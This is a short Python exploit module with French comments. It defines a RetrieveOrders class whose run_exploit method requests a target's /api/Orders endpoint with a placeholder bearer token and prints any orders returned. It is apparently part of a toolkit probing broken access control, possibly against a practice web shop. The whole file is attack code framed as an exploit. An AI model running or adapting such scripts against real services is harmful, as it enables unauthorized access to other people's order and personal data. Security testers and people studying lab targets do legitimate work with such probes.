import requests

class RetrieveOrders:
    def __init__(self, target_url: str):
        self.target_url = target_url

    def run_exploit(self):
        print(f"[+] Running Retrieve Orders on {self.target_url}")

        # Endpoint pour récupérer les commandes
        endpoint = f"{self.target_url}/api/Orders"
        headers = {"Authorization": "Bearer FAKE_USER_JWT"}

        try:
            response = requests.get(endpoint, headers=headers)
            if response.status_code == 200:
                print("[+] Successfully retrieved orders:")
                print(response.json())
            else:
                print(f"[-] Failed to retrieve orders: {response.status_code}")
        except Exception as e:
            print(f"[!] Error during Retrieve Orders: {e}")